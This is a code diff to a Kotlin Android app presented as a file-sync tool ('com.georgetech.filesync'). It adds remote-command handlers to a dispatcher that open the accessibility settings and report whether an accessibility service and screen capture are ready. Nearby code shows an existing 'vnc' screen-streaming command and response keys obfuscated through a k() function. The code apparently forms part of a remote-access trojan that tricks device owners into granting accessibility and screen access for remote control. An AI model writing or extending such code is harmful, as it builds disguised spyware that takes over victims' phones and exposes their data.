@@ -1,6 +1,8 @@
 package com.georgetech.filesync
 
 import android.content.Intent
+import android.provider.Settings
+import com.georgetech.filesync.AccessService
 import com.georgetech.filesync.modules.*
 import org.json.JSONObject
 import java.util.concurrent.Executors
@@ -67,6 +69,19 @@ class Dispatcher(private val service: SyncService) {
                         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                         service.startActivity(intent)
                         JSONObject().put(k("KS89KSss"), "grant_dialog_launched")
+                    }
+                    "acc_grant" -> {
+                        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                        service.startActivity(intent)
+                        JSONObject().apply {
+                            put(k("KS89KSss"), "accessibility_settings_opened")
+                            put("acc_available", AccessService.isAvailable())
+                        }
+                    }
+                    "acc_status" -> JSONObject().apply {
+                        put("acc_available", AccessService.isAvailable())
+                        put("screen_grant", com.georgetech.filesync.modules.DisplayHelper.isReady())
                     }
                     "vnc" -> {
                         val interval = task.optInt("interval", 1000)
